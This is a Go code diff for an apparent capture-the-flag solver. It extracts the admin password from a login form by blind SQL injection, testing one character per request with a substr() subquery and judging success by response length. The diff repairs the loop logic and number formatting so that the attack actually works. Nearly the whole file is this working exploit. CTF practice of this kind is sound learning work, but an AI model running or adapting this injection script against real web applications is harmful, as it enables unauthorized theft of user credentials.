@@ -3,37 +3,35 @@ package main
 import (
 	"net/url"
 	"net/http"
+	"strconv"
 )
 
 func httpReq(id string, pw string) (* http.Response) {
-	url := "http://ctfq.sweetduet.info:10080/~q6/"
+	targetUrl := "http://ctfq.sweetduet.info:10080/~q6/"
 	parameters := url.Values{}
-	parameters.Add("id", id)
+	parameters.Set("id", id)
 	parameters.Add("pass", pw)
-	res, err := http.PostForm(url, parameters)
+	res, err := http.PostForm(targetUrl, parameters)
 	if err != nil {
-		if res.StatusCode == 200 {
-			println(res.StatusCode)
-			print(res)
-		}
+
 	}
 	return res
 }
 
-func atkpw(pwLength int) (string) {
+func analysisPassword(passLength int) (string) {
 	// [a-zA-Z0-9]* のみ対応
 	startCode := []rune("0")[0]
 	endCode := []rune("z")[0]
 	flag := ""
-	for i := 0; pwLength < i; i++  {
-		for j := startCode; endCode < j; j++ {
-			id := "admin' AND substr((SELECT pass FROM user WHERE id='admin'), " + string(i + 1) + ", 1) = " + "'" + string(j) + "'" + " ; --"
+	for i := 0; passLength > i; i++  {
+		for j := startCode; endCode > j; j++ {
+			id := "admin' AND substr((SELECT pass FROM user WHERE id='admin'), " + strconv.Itoa(i + 1) + ", 1) = " + "'" + string(j) + "'" + " ; --"
 			pw := "''"
 			res := httpReq(id, pw)
+			// ResponseのContentLengthで成功したか判断
 			if res.ContentLength > int64(2000) {
-				print(string(i) + ": " + string(j))
 				flag = flag + string(j)
-				print("flag is : " + flag)
+				println("flag is : " + flag)
 				break
 			}
 		}
@@ -42,7 +40,7 @@ func atkpw(pwLength int) (string) {
 }
 
 func main() {
-	print("start")
-	plen := 21
-	atkpw(plen)
+	println("start")
+	passwordlength := 21
+	analysisPassword(passwordlength)
 }
